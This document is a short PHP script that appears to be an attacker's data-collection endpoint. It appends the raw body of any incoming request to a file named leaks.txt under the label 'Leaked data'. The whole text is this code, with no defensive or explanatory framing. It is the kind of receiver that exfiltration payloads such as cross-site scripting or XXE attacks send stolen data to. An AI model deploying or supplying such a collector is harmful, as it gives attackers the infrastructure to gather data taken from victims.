<?php
$log = fopen("leaks.txt", "a");
fwrite($log, "Leaked data: " . file_get_contents("php://input") . "\n\n");
fclose($log);
?>
